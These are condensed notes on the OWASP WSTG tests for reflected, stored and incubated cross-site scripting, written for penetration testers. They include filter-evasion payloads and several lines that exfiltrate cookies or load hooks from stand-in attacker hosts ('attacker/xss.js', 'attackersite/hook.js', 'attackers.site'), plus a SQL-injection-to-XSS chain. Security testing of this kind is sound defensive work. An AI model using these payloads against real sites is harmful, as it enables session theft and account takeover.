# WSTG INPV — Cross-Site Scripting & Incubated Persistence

OWASP WSTG v4.2. Input Validation subset. Tests WSTG-INPV-01, 02, 14.

## Table of Contents

- [INPV-01 Reflected XSS](#wstg-inpv-01)
- [INPV-02 Stored XSS](#wstg-inpv-02)
- [INPV-14 Incubated Vulnerability](#wstg-inpv-14)

---

## WSTG-INPV-01

**Testing for Reflected Cross Site Scripting**

Goal: find input reflected unsanitized in a single response — the most common XSS variant, delivered via a crafted link/form the victim is lured into triggering.

Black-box:
1. **Detect input vectors** — every user-controllable value: URL params, POST data, hidden fields, cookies. Use a proxy/HTML editor to surface hidden ones.
2. **Probe each vector** with test payloads:
   ```
   <script>alert(123)</script>
   "><script>alert(document.cookie)</script>
   ```
3. **Check impact** — inspect the reflected HTML for unencoded special chars. In HTML context: `>`, `<`, `&`, `'`, `"`. In a JS/attribute context: newline, CR, quotes, backslash, `\uXXXX`.

Example: `http://example.com/index.php?user=<script>alert(123)</script>` — an unsanitized `%username%` reflection fires the popup, confirming arbitrary JS execution in any victim who clicks the link.

**Filter bypass** — assume browsers/WAFs won't save you; sanitization is the only real control. Common evasions:

| Technique | Example |
|---|---|
| Attribute-context injection (no `<script>` needed) | `value="INPUT"` → submit `" onfocus="alert(document.cookie)` |
| Case/whitespace variation | `"><ScRiPt >alert(document.cookie)</ScRiPt >` |
| URL encoding | `%3cscript%3ealert(document.cookie)%3c/script%3e` |
| Non-recursive filter bypass (nested tag) | `<scr<script>ipt>alert(document.cookie)</script>` |
| Regex-anchored filter bypass (e.g. blocks `<script...src`) | insert an attribute between tag and `src`: `<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>` |
| HTTP Parameter Pollution | `?param=<script&param=>[...]</&param=script>` — exploits param concatenation quirks |

Refs: XSS Filter Evasion Cheat Sheet (OWASP).

Gray-box: review every user-input variable and its sanitization path for bypassable deny-lists or over-permissive allow-lists.

Tools: PHP Charset Encoder, Hackvertor, XSS-Proxy, ratproxy, Burp Proxy, OWASP ZAP.

---

## WSTG-INPV-02

**Testing for Stored Cross Site Scripting**

Goal: find input that's persisted server-side and later rendered unsanitized to other users — more dangerous than reflected XSS since no malicious link is needed, and it can hit high-privilege users (admins) automatically.

Black-box:
1. **Find storage points**: profile fields, shopping cart, file manager, app settings, forum/blog posts, logs — anywhere user input is saved and redisplayed. Check admin-only views too.
2. **Inject and confirm persistence**:
   ```
   aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
   ```
   Test via both GET and POST, and with client-side JS disabled if the app relies on it for filtering. If `"SCRIPT"` gets replaced/stripped, that's a filter to evade (see [INPV-01](#wstg-inpv-01) evasions).
3. **Weaponize** with a browser exploitation framework: inject a hook pointing at attacker infrastructure, e.g. `aaa@aa.com"><script src=http://attackersite/hook.js></script>` — every visitor to the vulnerable page then reports to BeEF, exposing cookies, screenshots, clipboard.
4. **File upload vector**: if uploads accept HTML/TXT, or the app doesn't enforce declared MIME type, an image upload can be re-served as `text/html` and execute as a page:
   ```
   Content-Disposition: form-data; name="uploadfile1"; filename="test.gif"
   Content-Type: text/html

   <script>alert(document.cookie)</script>
   ```
   Note IE historically renders `.txt` with HTML content as HTML regardless of declared type.

Gray-box: trace input from entry to storage to render. Grep for the language's request-binding primitives:

| Language | Look for |
|---|---|
| PHP | `$_GET`, `$_POST`, `$_REQUEST`, `$_FILES` |
| ASP | `Request.QueryString`, `Request.Form` |
| JSP/Servlet | `doGet`/`doPost`, `request.getParameter` |

Tools: PHP Charset Encoder, Hackvertor, BeEF, XSS-Proxy, Burp Proxy, OWASP ZAP.

Refs: XSS Filter Evasion Cheat Sheet (OWASP).

---

## WSTG-INPV-14

**Testing for Incubated Vulnerability**

Goal: chain a storage-side flaw (weak input validation) with a later execution-side flaw (weak output validation) — a "watering hole" pattern where a planted payload waits to be recalled and executed against other users.

Two conditions must both hold: (1) the attack vector gets persisted — weak validation, or injected via an alternate channel like an admin console or backend batch job; (2) the recalled vector executes — weak output encoding on replay.

Common vectors:

| Vector | Mechanism |
|---|---|
| File upload | corrupted media exploiting a parser CVE (e.g. malformed JPEG/PNG), or an executable/active-content file |
| Stored XSS in a forum/bulletin board | JS payload persists, executes in every later viewer's browser under the site's trust |
| SQL/XPath injection | attacker writes JS into a DB field (e.g. a page footer) that later renders unsanitized to all visitors |
| Misconfigured admin console | weak creds on Tomcat Manager (or similar) let an attacker deploy a new web app/WAR directly onto the trusted host |

Black-box:
- **File upload**: confirm what content-types are accepted and where the uploaded file resolves to, then get a victim to browse/download it.
- **Bulletin-board XSS**: inject a payload that exfiltrates cookies on view, e.g. `<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>`, with a listener at `attackers.site` capturing the resulting cookie-bearing requests.
- **SQL injection → stored XSS**: use a confirmed SQLi ([INPV-05](#) SQL Injection) to `UPDATE` a rendered field (e.g. a shared footer/notice) with a script payload, so every subsequent page view executes it against that visitor.
- **Misconfigured server**: weak/default creds on an admin console (Tomcat Web Application Manager, Plesk, cPanel) let an attacker deploy a persistent malicious component directly on the trusted host.

Gray-box: input validation review is key — check whether other systems sharing the same persistence layer could write tainted data via a back door, and confirm output encoding is applied at every render point regardless of entry path.

Tools: XSS-Proxy, OWASP ZAP, Burp Suite, Metasploit.

Refs: CERT CA-2000-02 *Malicious HTML Tags Embedded in Client Web Requests*; WASC Threat Classification — Cross-site Scripting.
